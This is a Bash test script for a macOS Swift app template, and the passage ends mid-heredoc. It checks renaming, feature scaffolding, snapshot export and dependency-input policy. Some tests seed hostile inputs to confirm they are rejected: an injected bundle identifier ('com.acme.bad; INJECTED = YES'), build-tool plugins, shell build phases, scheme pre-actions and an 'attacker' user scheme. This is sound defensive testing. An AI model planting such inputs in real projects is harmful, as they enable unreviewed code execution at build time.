#!/bin/bash -p
# Destructive template tests run only in disposable copies of the checkout.
set -uo pipefail

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
TMP_ROOT="$(mktemp -d "${TMPDIR:-/tmp}/swiftmac-template-tests.XXXXXX")"
FAILURES=0
trap 'rm -rf "$TMP_ROOT"' EXIT

fixture() {
  local name="$1"
  local destination="$TMP_ROOT/$name"
  mkdir -p "$destination"
  rsync -a \
    --exclude '.git' \
    --exclude '.build' \
    --exclude '.snapshot-operation-lock' \
    --exclude '.snapshot-record-token' \
    --exclude 'artifacts' \
    --exclude 'node_modules' \
    --exclude 'Packages/*/.build' \
    "$ROOT/" "$destination/"
  git -C "$destination" init -q
  git -C "$destination" add -A
  git -C "$destination" \
    -c user.name='Template Smoke' \
    -c user.email='template-smoke@example.invalid' \
    commit -qm 'fixture baseline'
  printf '%s\n' "$destination"
}

run_test() {
  local name="$1"
  shift
  echo "== template smoke: $name =="
  ( set -e; "$@" )
  local status=$?
  if [[ "$status" -eq 0 ]]; then
    echo "PASS  $name"
  else
    echo "FAIL  $name" >&2
    FAILURES=$((FAILURES + 1))
  fi
}

expect_dependency_rejection() {
  local copy="$1" expected="$2" log
  log="$copy/dependency-rejection.log"
  if "$copy/scripts/check-dependency-inputs.sh" >"$log" 2>&1; then
    echo "dependency preflight accepted a seeded input: $expected" >&2
    return 1
  fi
  if ! /usr/bin/grep -Fq -- "$expected" "$log"; then
    echo "dependency preflight failed without the expected diagnosis: $expected" >&2
    /bin/cat "$log" >&2
    return 1
  fi
}

expect_command_rejection() {
  local expected="$1" log="$2"
  shift 2
  if "$@" >"$log" 2>&1; then
    echo "guarded command accepted a seeded dependency input: $expected" >&2
    return 1
  fi
  if ! /usr/bin/grep -Fq -- "$expected" "$log"; then
    echo "guarded command failed without the expected diagnosis: $expected" >&2
    /bin/cat "$log" >&2
    return 1
  fi
}

expect_ci_rejection() {
  local copy="$1" expected="$2" log
  log="$copy/ci-rejection.log"
  if "$copy/scripts/check-ci-security.sh" >"$log" 2>&1; then
    echo "CI policy accepted a seeded boundary violation: $expected" >&2
    return 1
  fi
  if ! /usr/bin/grep -Fq -- "$expected" "$log"; then
    echo "CI policy failed without the expected diagnosis: $expected" >&2
    /bin/cat "$log" >&2
    return 1
  fi
}

wait_for_process_marker() {
  local marker="$1" pid="$2"
  local attempt
  for attempt in {1..9000}; do
    if [[ -f "$marker" ]]; then
      return 0
    fi
    kill -0 "$pid" 2>/dev/null || return 1
    /bin/sleep 0.01
  done
  return 1
}

test_shell_assertions_are_explicit() {
  /usr/bin/python3 -I - "$ROOT/scripts/test-template.sh" <<'PY'
import pathlib
import re
import sys

path = pathlib.Path(sys.argv[1])
bare_assertions = [
    number
    for number, line in enumerate(path.read_text().splitlines(), start=1)
    if re.match(r"^\s*\[\[.*\]\]\s*$", line)
    or re.match(r"^\s*\(\(.*\)\)\s*$", line)
    or (re.match(r"^\s*!\s+", line) and "&& break" not in line and "|| return 1" not in line)
]
if bare_assertions:
    raise SystemExit(
        "Bash 3.2 assertions require explicit failure propagation at lines: "
        + ", ".join(map(str, bare_assertions))
    )
PY
}

snapshot_baseline_tree_digest() {
  /usr/bin/python3 -I - "$1" <<'PY'
import hashlib
import os
import pathlib
import sys

root = pathlib.Path(sys.argv[1])
digest = hashlib.sha256()
for directory, names, files in os.walk(str(root), topdown=True, followlinks=False):
    names[:] = [name for name in names if name != ".build"]
    directory_path = pathlib.Path(directory)
    if "__Snapshots__" not in directory_path.parts:
        continue
    for name in sorted(files):
        path = directory_path / name
        relative = str(path.relative_to(root)).encode()
        content = path.read_bytes()
        digest.update(len(relative).to_bytes(8, "big"))
        digest.update(relative)
        digest.update(len(content).to_bytes(8, "big"))
        digest.update(content)
print(digest.hexdigest())
PY
}

assert_target_bundles() {
  local project="$1"
  local app_bundle="$2"
  local tests_bundle="$3"
  /usr/bin/python3 -I - "$project" "$app_bundle" "$tests_bundle" <<'PY'
import json
import subprocess
import sys

project, expected_app, expected_tests = sys.argv[1:]
result = subprocess.run(
    ["plutil", "-convert", "json", "-o", "-", project],
    check=True,
    capture_output=True,
    text=True,
)
objects = json.loads(result.stdout)["objects"]

def bundles(target_name):
    target = next(
        value for value in objects.values()
        if value.get("isa") == "PBXNativeTarget" and value.get("name") == target_name
    )
    config_list = objects[target["buildConfigurationList"]]
    return {
        objects[config_id]["buildSettings"]["PRODUCT_BUNDLE_IDENTIFIER"]
        for config_id in config_list["buildConfigurations"]
    }

assert bundles("App") == {expected_app}, bundles("App")
assert bundles("AppTests") == {expected_tests}, bundles("AppTests")
PY
}

test_rename_is_target_aware_and_escaped() {
  local copy
  copy="$(fixture rename)"
  "$copy/scripts/rename-app.sh" 'Audit "App"' com.acme.audit
  plutil -lint "$copy/App.xcodeproj/project.pbxproj" >/dev/null
  assert_target_bundles \
    "$copy/App.xcodeproj/project.pbxproj" \
    com.acme.audit \
    com.acme.auditTests
  /usr/bin/python3 -I - "$copy" <<'PY'
import json
import pathlib
import sys

root = pathlib.Path(sys.argv[1])
checks = (
    ("App/Resources/Localizable.xcstrings", "app.name"),
    ("App/Resources/InfoPlist.xcstrings", "CFBundleDisplayName"),
)
for relative, key in checks:
    data = json.loads((root / relative).read_text())
    value = data["strings"][key]["localizations"]["en"]["stringUnit"]["value"]
    assert value == 'Audit "App"', (relative, value)
PY

  local idempotent_before idempotent_after
  idempotent_before="$(bash -c '. "$1/scripts/lib.sh"; source_state_hash' _ "$copy")"
  "$copy/scripts/rename-app.sh" 'Audit "App"' com.acme.audit >/dev/null
  idempotent_after="$(bash -c '. "$1/scripts/lib.sh"; source_state_hash' _ "$copy")"
  [[ "$idempotent_before" == "$idempotent_after" ]] || return 1

  local before
  before="$(shasum -a 256 "$copy/App.xcodeproj/project.pbxproj" | awk '{print $1}')"
  if "$copy/scripts/rename-app.sh" Bad 'com.acme.bad; INJECTED = YES' >/dev/null 2>&1; then
    echo "malformed bundle identifier was accepted" >&2
    return 1
  fi
  [[ "$before" == "$(shasum -a 256 "$copy/App.xcodeproj/project.pbxproj" | awk '{print $1}')" ]] || return 1
}

test_feature_linking_without_sample_anchor() {
  local before_duplicate copy export_dir first_log first_status second_log
  copy="$(fixture feature)"
  mkdir -p "$copy/artifacts"
  /usr/bin/python3 -I - "$copy/Packages/Features/Package.swift" <<'PY'
import pathlib
import sys

path = pathlib.Path(sys.argv[1])
text = path.read_text()
text = text.replace('                "ItemList",\n', "", 1)
path.write_text(text)
PY
  "$copy/scripts/check-dependency-inputs.sh" --write >/dev/null
  "$copy/scripts/new-feature.sh" SmokeFeature >/dev/null
  "$copy/scripts/new-feature.sh" OtherFeature >/dev/null
  /bin/mv \
    "$copy/Packages/Features/Tests/SmokeFeatureTests/SmokeFeatureSnapshotTests.swift" \
    "$copy/Packages/Features/Tests/SmokeFeatureTests/SnapshotTests.swift"
  /bin/mv \
    "$copy/Packages/Features/Tests/OtherFeatureTests/OtherFeatureSnapshotTests.swift" \
    "$copy/Packages/Features/Tests/OtherFeatureTests/SnapshotTests.swift"
  /usr/bin/python3 -I - "$copy/Packages/Features/Tests/SmokeFeatureTests/SnapshotTests.swift" <<'PY'
import pathlib
import sys

path = pathlib.Path(sys.argv[1])
text = path.read_text().replace(
    "assertScreenSnapshot(of: screen())",
    'assertScreenSnapshot(of: screen(), named: "ready\\tstate\\r")',
    1,
)
path.write_text(text)
PY
  "$copy/scripts/format.sh" --check >/dev/null
  if ! "$copy/scripts/support/run_with_timeout.py" \
    --timeout 300 \
    --log "$copy/artifacts/feature-test.log" \
    -- "$copy/scripts/support/run_sanitized.sh" /usr/bin/swift test \
      --package-path "$copy/Packages/Features" \
      --filter SmokeFeatureModelTests \
    >/dev/null; then
    cat "$copy/artifacts/feature-test.log" >&2
    return 1
  fi
  plutil -lint "$copy/App.xcodeproj/project.pbxproj" >/dev/null
  "$copy/scripts/support/run_sanitized.sh" /usr/bin/swift package \
    --package-path "$copy/Packages/Features" dump-package >"$copy/artifacts/package.json"
  /usr/bin/python3 -I - "$copy/App.xcodeproj/project.pbxproj" "$copy/artifacts/package.json" <<'PY'
import json
import subprocess
import sys

result = subprocess.run(
    ["plutil", "-convert", "json", "-o", "-", sys.argv[1]],
    check=True,
    capture_output=True,
    text=True,
)
objects = json.loads(result.stdout)["objects"]
product_id, _ = next(
    (key, value) for key, value in objects.items()
    if value.get("isa") == "XCSwiftPackageProductDependency"
    and value.get("productName") == "AppFeatures"
)
app = next(
    value for value in objects.values()
    if value.get("isa") == "PBXNativeTarget" and value.get("name") == "App"
)
assert product_id in app["packageProductDependencies"]
framework_phases = [
    objects[phase_id] for phase_id in app["buildPhases"]
    if objects[phase_id].get("isa") == "PBXFrameworksBuildPhase"
]
assert len(framework_phases) == 1
assert any(
    objects[file_id].get("productRef") == product_id
    for file_id in framework_phases[0]["files"]
)
assert not any(
    value.get("isa") == "XCSwiftPackageProductDependency"
    and value.get("productName") == "SmokeFeature"
    for value in objects.values()
)

package = json.loads(open(sys.argv[2]).read())
app_features = next(product for product in package["products"] if product["name"] == "AppFeatures")
assert "SmokeFeature" in app_features["targets"], app_features
assert "OtherFeature" in app_features["targets"], app_features
item_list = next(product for product in package["products"] if product["name"] == "ItemList")
assert item_list["targets"] == ["ItemList"], item_list
PY

  export_dir="$copy/artifacts/multi-feature-export"
  first_log="$copy/artifacts/multi-feature-first.log"
  second_log="$copy/artifacts/multi-feature-second.log"
  set +e
  "$copy/scripts/support/run_with_timeout.py" \
    --timeout 300 \
    --log "$first_log" \
    -- "$copy/scripts/support/run_sanitized.sh" /usr/bin/env \
      SNAPSHOTS_EXPORT_DIR="$export_dir" \
      SNAPSHOTS_RUNNING_FOR_PREVIEWS=1 \
      /usr/bin/swift test \
      --package-path "$copy/Packages/Features" \
      -Xswiftc -DSNAPSHOT_TESTS \
      -Xswiftc -DSNAPSHOT_BASELINE_VERIFICATION \
      --filter '^(SmokeFeatureTests\.|OtherFeatureTests\.)' \
    >/dev/null
  first_status=$?
  set -e
  [[ "$first_status" -ne 0 ]] || return 1
  grep -q "recorded snapshot" "$first_log"
  ! grep -q "error: emit-module command failed" "$first_log" || return 1

  rm -rf "$export_dir"
  mkdir -p "$export_dir"
  mkdir "$TMP_ROOT/.snapshot-record-token"
  if ! "$copy/scripts/support/run_with_timeout.py" \
    --timeout 300 \
    --log "$second_log" \
    -- "$copy/scripts/support/run_sanitized.sh" /usr/bin/env \
      SNAPSHOTS_EXPORT_DIR="$export_dir" \
      SNAPSHOTS_RUNNING_FOR_PREVIEWS=1 \
      /usr/bin/swift test \
      --package-path "$copy/Packages/Features" \
      -Xswiftc -DSNAPSHOT_TESTS \
      -Xswiftc -DSNAPSHOT_BASELINE_VERIFICATION \
      --filter '^(SmokeFeatureTests\.|OtherFeatureTests\.)' \
    >/dev/null; then
    cat "$second_log" >&2
    return 1
  fi
  rmdir "$TMP_ROOT/.snapshot-record-token"
  [[ "$(find "$export_dir" -name '*.png' | wc -l | tr -d ' ')" -eq 12 ]] || return 1
  [[ "$(find "$export_dir" -name '*.json' | wc -l | tr -d ' ')" -eq 12 ]] || return 1
  [[ "$(find "$export_dir" -name '*.png' -exec basename {} \; | sort -u | wc -l | tr -d ' ')" -eq 12 ]] || return 1
  /usr/bin/python3 -I - "$export_dir" <<'PY'
import json
import pathlib
import sys

sidecars = [json.loads(path.read_text()) for path in pathlib.Path(sys.argv[1]).glob("*.json")]
assert any(item["display_name"] == "ready\tstate\r-light" for item in sidecars)
assert all(item["context"]["file_id"] for item in sidecars)
assert any(
    item["baseline_identity"] == "SmokeFeatureTests/SnapshotTests/ready.ready-state-light"
    for item in sidecars
)
assert {
    item["baseline_identity"].split("/", 1)[0]
    for item in sidecars
} == {"SmokeFeatureTests", "OtherFeatureTests"}
PY

  if ! "$copy/scripts/snapshot.sh" \
    --render-only Features >"$copy/artifacts/multi-feature-render.log" 2>&1; then
    cat "$copy/artifacts/multi-feature-render.log" >&2
    return 1
  fi
  grep -q 'snapshot render inventory: OK (25 complete logical renders)' \
    "$copy/artifacts/multi-feature-render.log"
  grep -q '^SNAPSHOT_BASELINES_VERIFIED=false$' "$copy/artifacts/multi-feature-render.log"

  before_duplicate="$(bash -c '. "$1/scripts/lib.sh"; source_state_hash' _ "$copy")"
  if "$copy/scripts/new-feature.sh" SmokeFeature >/dev/null 2>&1; then
    echo "duplicate feature scaffold was accepted" >&2
    return 1
  fi
  [[ "$before_duplicate" == "$(bash -c '. "$1/scripts/lib.sh"; source_state_hash' _ "$copy")" ]] || return 1
}

test_feature_preflight_failure_is_inert() {
  local before copy
  copy="$(fixture feature-preflight)"
  /usr/bin/python3 -I - "$copy/Packages/Features/Package.swift" <<'PY'
import pathlib
import sys

path = pathlib.Path(sys.argv[1])
path.write_text(path.read_text().replace("        // agent:feature-targets", ""))
PY
  "$copy/scripts/check-dependency-inputs.sh" \
    --write Packages/Features/Package.swift >/dev/null
  before="$(bash -c '. "$1/scripts/lib.sh"; source_state_hash' _ "$copy")"
  if "$copy/scripts/new-feature.sh" BrokenFeature >/dev/null 2>&1; then
    echo "feature scaffold accepted a missing shared marker" >&2
    return 1
  fi
  [[ "$before" == "$(bash -c '. "$1/scripts/lib.sh"; source_state_hash' _ "$copy")" ]] || return 1
  [[ ! -e "$copy/Packages/Features/Sources/BrokenFeature" ]] || return 1

  before="$(bash -c '. "$1/scripts/lib.sh"; source_state_hash' _ "$copy")"
  if "$copy/scripts/new-feature.sh" Domain >/dev/null 2>&1; then
    echo "feature scaffold accepted a reserved module name" >&2
    return 1
  fi
  [[ "$before" == "$(bash -c '. "$1/scripts/lib.sh"; source_state_hash' _ "$copy")" ]] || return 1
}

test_factory_api_rejects_package_wrapper() {
  local copy log source
  copy="$(fixture factory-api-wrapper)"
  log="$copy/factory-api-drift.log"
  source="$copy/Packages/Factory/Sources/FactoryCore/UnauthorizedPackageAuthorityWrapper.swift"
  printf '%s\n' \
    'package enum UnauthorizedPackageAuthorityWrapper {' \
    '    package static let isActivated = true' \
    '}' >"$source"

  if "$copy/scripts/check-factory-api.sh" >"$log" 2>&1; then
    echo "Factory API freeze accepted a new package authority wrapper" >&2
    return 1
  fi
  /usr/bin/grep -Fq \
    'swift.enum | package | UnauthorizedPackageAuthorityWrapper | enum UnauthorizedPackageAuthorityWrapper' \
    "$log"
  /usr/bin/grep -Fq \
    'Factory public/package API drift detected.' \
    "$log"
}

test_dependency_control_plane_rejects_mutations() {
  local copy domain_package gitignore original_dir pbxproj scheme swiftformat swiftlint user_scheme
  copy="$(fixture dependency-control-plane)"
  domain_package="$copy/Packages/Domain/Package.swift"
  pbxproj="$copy/App.xcodeproj/project.pbxproj"
  scheme="$copy/App.xcodeproj/xcshareddata/xcschemes/App.xcscheme"
  swiftlint="$copy/.swiftlint.yml"
  swiftformat="$copy/.swiftformat"
  gitignore="$copy/.gitignore"
  original_dir="$TMP_ROOT/dependency-control-plane-originals"
  mkdir -p "$original_dir"
  cp "$domain_package" "$original_dir/Domain-Package.swift"
  cp "$pbxproj" "$original_dir/project.pbxproj"
  cp "$scheme" "$original_dir/App.xcscheme"
  cp "$swiftlint" "$original_dir/swiftlint.yml"
  cp "$swiftformat" "$original_dir/swiftformat"
  cp "$gitignore" "$original_dir/gitignore"

  printf '\nlet unreviewedPlugin = Target.plugin(name: "Unreviewed", capability: .buildTool())\n' \
    >>"$domain_package"
  expect_dependency_rejection \
    "$copy" \
    "Packages/Domain/Package.swift: SwiftPM build-tool plugins are forbidden"
  expect_command_rejection \
    "Packages/Domain/Package.swift: SwiftPM build-tool plugins are forbidden" \
    "$copy/build-dependency-rejection.log" \
    "$copy/scripts/build.sh"
  expect_command_rejection \
    "Packages/Domain/Package.swift: SwiftPM build-tool plugins are forbidden" \
    "$copy/doctor-dependency-rejection.log" \
    "$copy/scripts/doctor.sh"
  expect_command_rejection \
    "Packages/Domain/Package.swift: SwiftPM build-tool plugins are forbidden" \
    "$copy/xcodebuildmcp-dependency-rejection.log" \
    "$copy/scripts/xcodebuildmcp.sh" mcp
  cp "$original_dir/Domain-Package.swift" "$domain_package"

  mkdir -p "$copy/Packages/Domain/.swiftpm/xcode"
  "$copy/scripts/check-dependency-inputs.sh" >/dev/null
  printf '{}\n' >"$copy/Packages/Domain/.swiftpm/xcode/workspace-state.json"
  expect_dependency_rejection \
    "$copy" \
    "Packages/Domain/.swiftpm/xcode/workspace-state.json: generated SwiftPM cache contains an unreviewed entry"
  rm "$copy/Packages/Domain/.swiftpm/xcode/workspace-state.json"

  printf '\n# unrelated drift during exact refresh\n' >>"$swiftlint"
  expect_command_rejection \
    ".swiftlint.yml: reviewed dependency input digest changed" \
    "$copy/exact-refresh-rejection.log" \
    "$copy/scripts/check-dependency-inputs.sh" --write App.xcodeproj/project.pbxproj
  cp "$original_dir/swiftlint.yml" "$swiftlint"

  printf '\n/* Begin PBXShellScriptBuildPhase section */\n' >>"$pbxproj"
  expect_dependency_rejection \
    "$copy" \
    "App.xcodeproj/project.pbxproj: Xcode shell build phases are forbidden"
  cp "$original_dir/project.pbxproj" "$pbxproj"

  /usr/bin/python3 -I - "$scheme" <<'PY'
import pathlib
import sys

path = pathlib.Path(sys.argv[1])
text = path.read_text()
needle = '   version = "1.7">\n'
assert text.count(needle) == 1
path.write_text(text.replace(needle, needle + "   <PreActions></PreActions>\n", 1))
PY
  expect_dependency_rejection \
    "$copy" \
    "App.xcodeproj/xcshareddata/xcschemes/App.xcscheme: Xcode scheme pre-actions are forbidden"
  cp "$original_dir/App.xcscheme" "$scheme"

  user_scheme="$copy/App.xcodeproj/xcuserdata/attacker.xcuserdatad/xcschemes/App.xcscheme"
  mkdir -p "${user_scheme%/*}"
  cp "$original_dir/App.xcscheme" "$user_scheme"
  expect_dependency_rejection \
    "$copy" \
    "App.xcodeproj/xcuserdata/attacker.xcuserdatad/xcschemes/App.xcscheme: executable Xcode user build inputs are forbidden"
  rm -rf "$copy/App.xcodeproj/xcuserdata"

  printf '\n# unreviewed lint drift\n' >>"$swiftlint"
  expect_dependency_rejection \
    "$copy" \
    ".swiftlint.yml: reviewed dependency input digest changed"
  cp "$original_dir/swiftlint.yml" "$swiftlint"

  printf '\n# unreviewed format drift\n' >>"$swiftformat"
  expect_dependency_rejection \
    "$copy" \
    ".swiftformat: reviewed dependency input digest changed"
  cp "$original_dir/swiftformat" "$swiftformat"

  printf '\n# unreviewed ignore drift\n' >>"$gitignore"
  expect_dependency_rejection \
    "$copy" \
    ".gitignore: reviewed dependency input digest changed"
  cp "$original_dir/gitignore" "$gitignore"

  "$copy/scripts/check-dependency-inputs.sh" >/dev/null
}

test_preview_review_rejects_missing_fresh_export() {
  local copy empty head source_state
  copy="$(fixture preview)"
  empty="$copy/artifacts/preview-exports/empty-export"
  mkdir -p "$empty"
  source_state="$(bash -c '. "$1/scripts/lib.sh"; source_state_hash' _ "$copy")"
  head="$(git -C "$copy" rev-parse HEAD)"
  /usr/bin/python3 -I - "$empty/run.json" "$source_state" "$head" <<'PY'
import json
import pathlib
import sys

pathlib.Path(sys.argv[1]).write_text(json.dumps({
    "schema_version": 2,
    "package": "Features",
    "filter": "",
    "status": 0,
    "valid": True,
    "verification_mode": "baseline",
    "verification_scope": "complete",
    "baselines_verified": True,
    "source_state_sha256": sys.argv[2],
    "head_commit": sys.argv[3],
    "renderer": {
        "macos_product_version": "test",
        "macos_build_version": "test",
        "architecture": "arm64",
        "xcode_version": "test",
        "sdk_version": "test",
        "sdk_build_version": "test",
        "swift_version": "test",
        "snapshot_testing_resolution_sha256": "0" * 64,
        "backing_scale_factor": 2,
        "color_space": "kCGColorSpaceDisplayP3",
    },
    "exports": [],
}) + "\n")
PY
  if "$copy/scripts/preview-review.sh" Features "" "$empty" >"$copy/artifacts/preview.log" 2>&1; then
    echo "preview review accepted an empty fresh-export directory" >&2
    return 1
  fi
  if ! grep -q "fresh SnapshotSupport" "$copy/artifacts/preview.log"; then
    cat "$copy/artifacts/preview.log" >&2
    return 1
  fi
}

test_snapshot_filter_contract() {
  local bad canonical copy matches
  copy="$(fixture filter)"
  # shellcheck disable=SC1090
  . "$copy/scripts/lib.sh"
  canonical="$(snapshot_test_filter "ItemListTests/ItemListSnapshotTests/loaded")"
  [[ "$canonical" == "^ItemListTests\.ItemListSnapshotTests/loaded\b" ]] || return 1
  matches="$(printf '%s\n' \
    'ItemListTests.ItemListSnapshotTests/loaded()' \
    'ItemListTests.ItemListSnapshotTests/loadedAtAccessibilitySize()' \
    | grep -E "$canonical")"
  [[ "$matches" == 'ItemListTests.ItemListSnapshotTests/loaded()' ]] || return 1
  for bad in \
    'Target/' \
    'Target/Suite/' \
    'Target/Suite/test/' \
    'Target//test' \
    'Target/Suite/test/extra' \
    'Target /Suite/test' \
    'Target/Suite/test.*'; do
    if snapshot_test_filter "$bad" >/dev/null 2>&1; then
      echo "invalid snapshot filter was accepted: $bad" >&2
      return 1
    fi
  done

  canonical="$(printf '%s\n' \
    'ItemListTests.ItemListSnapshotTests/loaded()' \
    'DesignSystemTests.DSGallerySnapshotTests/gallery()' \
    | snapshot_exact_filter)"
  printf '%s\n' 'ItemListTests.ItemListSnapshotTests/loaded()' | grep -Eq "$canonical"
  ! printf '%s\n' 'ItemListTests.VisualRegression/hiddenSnapshot()' | grep -Eq "$canonical" || return 1

  cat >"$copy/Packages/Features/Tests/ItemListTests/VisualRegression.swift" <<'EOF'
import SnapshotSupport
import SwiftUI

struct VisualRegression {
    func hiddenSnapshot() {
        assertScreenSnapshot(of: Text("hidden"))
    }
}
EOF
  if "$copy/scripts/check-previews.sh" >/dev/null 2>&1; then
    echo "snapshot assertion outside a SnapshotTests file/suite was accepted" >&2
    return 1
  fi
}

test_snapshot_render_only_contract() {
  local baseline baseline_digest baseline_tree_before backup copy dark_backup dark_baseline expected export_dir fresh_dark fresh_light identity inventory_backup inventory_baseline inventory_fixture inventory_log inventory_status log mode_log mode_status render_status rendered_path source_file stale_fixture stale_log stale_status strict_log strict_status strict_success_log test_support_manifest unsafe unsafe_log unsafe_source
  copy="$(fixture snapshot-render-only)"
  baseline="$copy/Packages/Features/Tests/ItemListTests/__Snapshots__/ItemListSnapshotTests/empty.light.png"
  dark_baseline="$copy/Packages/Features/Tests/ItemListTests/__Snapshots__/ItemListSnapshotTests/empty.dark.png"
  backup="$TMP_ROOT/empty.light.original.png"
  dark_backup="$TMP_ROOT/empty.dark.original.png"
  log="$copy/artifacts/render-only.log"
  strict_log="$copy/artifacts/strict-snapshot.log"
  mkdir -p "$copy/artifacts"
  /bin/cp "$baseline" "$backup"
  /bin/cp "$dark_baseline" "$dark_backup"
  /bin/cp \
    "$copy/Packages/Features/Tests/ItemListTests/__Snapshots__/ItemListSnapshotTests/loaded.light.png" \
    "$baseline"
  baseline_digest="$(shasum -a 256 "$baseline" | awk '{print $1}')"
  baseline_tree_before="$(snapshot_baseline_tree_digest "$copy/Packages/Features")"

  set +e
  "$copy/scripts/snapshot.sh" --render-only Features >"$log" 2>&1
  render_status=$?
  set -e
  if [[ "$render_status" -ne 0 ]]; then
    cat "$log" >&2
    return 1
  fi
  if [[ "$baseline_digest" != "$(shasum -a 256 "$baseline" | awk '{print $1}')" ]]; then
    echo "render-only snapshot changed a baseline file" >&2
    cat "$log" >&2
    return 1
  fi
  if [[ "$baseline_tree_before" != "$(snapshot_baseline_tree_digest "$copy/Packages/Features")" ]]; then
    echo "render-only snapshot changed the baseline tree" >&2
    cat "$log" >&2
    return 1
  fi
  for expected in \
    'snapshot render inventory: OK (13 complete logical renders)' \
    'SNAPSHOT_VERIFICATION_MODE=render-only' \
    'SNAPSHOT_VERIFICATION_SCOPE=complete' \
    'SNAPSHOT_BASELINES_VERIFIED=false' \
    'PREVIEW_REVIEW_MODE=render-only' \
    'PREVIEW_REVIEW_SCOPE=complete' \
    'PREVIEW_REVIEW_BASELINES_VERIFIED=false'; do
    if ! grep -Fxq "$expected" "$log"; then
      echo "render-only snapshot output is missing: $expected" >&2
      cat "$log" >&2
      return 1
    fi
  done

  export_dir="$(find "$copy/artifacts/preview-exports" -mindepth 1 -maxdepth 1 -type d -print)"
  if [[ -z "$export_dir" \
    || "$(printf '%s\n' "$export_dir" | wc -l | tr -d ' ')" -ne 1 ]]; then
    echo "render-only snapshot did not retain exactly one export directory" >&2
    find "$copy/artifacts" -maxdepth 3 -print >&2
    cat "$log" >&2
    return 1
  fi
  /usr/bin/python3 -I - "$export_dir/run.json" <<'PY'
import json
import pathlib
import sys

path = pathlib.Path(sys.argv[1])
manifest = json.loads(path.read_text())
assert manifest["schema_version"] == 2
assert manifest["verification_mode"] == "render-only"
assert manifest["verification_scope"] == "complete"
assert manifest["baselines_verified"] is False
assert manifest["valid"] is True
assert manifest["baseline_provenance"] == "legacy-unknown"
assert len(manifest["exports"]) == 13
assert manifest["renderer"]["backing_scale_factor"] == 2
assert manifest["renderer"]["color_space"] == "kCGColorSpaceDisplayP3"
assert all(item["pixel_width"] == 2000 for item in manifest["exports"])
assert all(item["pixel_height"] == 1400 for item in manifest["exports"])
assert all(item["point_width"] == 1000 for item in manifest["exports"])
assert all(item["point_height"] == 700 for item in manifest["exports"])
assert all(item["backing_scale_factor"] == 2 for item in manifest["exports"])
assert all(item["color_profile"] == "kCGColorSpaceDisplayP3" for item in manifest["exports"])
sidecars = [
    json.loads(candidate.read_text())
    for candidate in path.parent.glob("*.json")
    if candidate.name != "run.json"
]
assert len(sidecars) == 13
assert all(item["verification_mode"] == "render-only" for item in sidecars)
assert all(item["render"]["backing_scale_factor"] == 2 for item in sidecars)
PY

  source_file="$copy/Packages/Features/Tests/ItemListTests/ItemListSnapshotTests.swift"
  /usr/bin/python3 -I - "$source_file" <<'PY'
import pathlib
import sys

path = pathlib.Path(sys.argv[1])
text = path.read_text()
text = text.replace("    import DesignSystem\n", "    import Darwin\n    import DesignSystem\n", 1)
text = text.replace(
    "        @Test func empty() {\n            assertScreenSnapshot",
    "        @Test func empty() {\n"
    "            setenv(\"SNAPSHOTS_VERIFICATION_MODE\", \"render-only\", 1)\n"
    "            assertScreenSnapshot",
    1,
)
path.write_text(text)
PY
  set +e
  "$copy/scripts/snapshot.sh" \
    Features ItemListTests/ItemListSnapshotTests/empty >"$strict_log" 2>&1
  strict_status=$?
  set -e
  [[ "$strict_status" -ne 0 ]] || return 1
  grep -q 'does not match reference' "$strict_log"
  [[ "$baseline_digest" == "$(shasum -a 256 "$baseline" | awk '{print $1}')" ]] || return 1
  fresh_light=""
  fresh_dark=""
  while IFS=$'\t' read -r identity rendered_path; do
    case "$identity" in
      ItemListTests/ItemListSnapshotTests/empty.light) fresh_light="$rendered_path" ;;
      ItemListTests/ItemListSnapshotTests/empty.dark) fresh_dark="$rendered_path" ;;
      *) return 1 ;;
    esac
  done < <(/usr/bin/python3 -I - "$export_dir/run.json" <<'PY'
import hashlib
import json
import pathlib
import sys

manifest_path = pathlib.Path(sys.argv[1])
manifest = json.loads(manifest_path.read_text())
identities = {
    "ItemListTests/ItemListSnapshotTests/empty.dark",
    "ItemListTests/ItemListSnapshotTests/empty.light",
}
matches = [item for item in manifest["exports"] if item["baseline_identity"] in identities]
if len(matches) != 2 or {item["baseline_identity"] for item in matches} != identities:
    raise SystemExit("current-host empty renders are ambiguous")
for item in sorted(matches, key=lambda value: value["baseline_identity"]):
    candidate = manifest_path.parent / item["path"]
    content = candidate.read_bytes()
    if (
        candidate.parent != manifest_path.parent
        or candidate.is_symlink()
        or not candidate.is_file()
        or hashlib.sha256(content).hexdigest() != item["sha256"]
    ):
        raise SystemExit("current-host empty render failed integrity validation")
    print(f"{item['baseline_identity']}\t{candidate}")
PY
  )
  [[ -n "$fresh_light" && -n "$fresh_dark" ]] || return 1
  /bin/cp "$fresh_light" "$baseline"
  /bin/cp "$fresh_dark" "$dark_baseline"

  strict_success_log="$copy/artifacts/strict-filtered-success.log"
  if ! "$copy/scripts/snapshot.sh" \
    Features ItemListTests/ItemListSnapshotTests/empty >"$strict_success_log" 2>&1; then
    echo "strict filtered snapshot did not match its validated current-host reference" >&2
    cat "$strict_success_log" >&2
    return 1
  fi
  grep -q 'snapshot render inventory: OK (2 filtered logical renders)' "$strict_success_log"
  grep -q '^SNAPSHOT_VERIFICATION_SCOPE=filtered$' "$strict_success_log"
  grep -q '^SNAPSHOT_BASELINES_VERIFIED=false$' "$strict_success_log"
  grep -q '^PREVIEW_REVIEW_SCOPE=filtered$' "$strict_success_log"
  grep -q '^PREVIEW_REVIEW_BASELINES_VERIFIED=false$' "$strict_success_log"
  /bin/cp "$backup" "$baseline"
  /bin/cp "$dark_backup" "$dark_baseline"

  inventory_baseline="$copy/Packages/Features/Tests/ItemListTests/__Snapshots__/ItemListSnapshotTests/doneItem.light.png"
  inventory_backup="$TMP_ROOT/doneItem.light.original.png"
  inventory_log="$copy/artifacts/render-inventory-mismatch.log"
  /bin/mv "$inventory_baseline" "$inventory_backup"
  set +e
  "$copy/scripts/snapshot.sh" --render-only Features >"$inventory_log" 2>&1
  inventory_status=$?
  set -e
  [[ "$inventory_status" -ne 0 ]] || return 1
  grep -q 'snapshot render inventory mismatch: missing=0 unexpected=1' "$inventory_log"
  /bin/mv "$inventory_backup" "$inventory_baseline"

  stale_fixture="$copy/artifacts/inventory-stale"
  stale_log="$copy/artifacts/inventory-stale.log"
  mkdir "$stale_fixture"
  /usr/bin/rsync -a --exclude run.json "$export_dir/" "$stale_fixture/"
  /usr/bin/python3 -I - "$export_dir/run.json" "$stale_fixture" <<'PY'
import json
import pathlib
import sys

manifest_path = pathlib.Path(sys.argv[1])
fixture = pathlib.Path(sys.argv[2])
manifest = json.loads(manifest_path.read_text())
identities = {
    "ItemListTests/ItemListSnapshotTests/empty.dark",
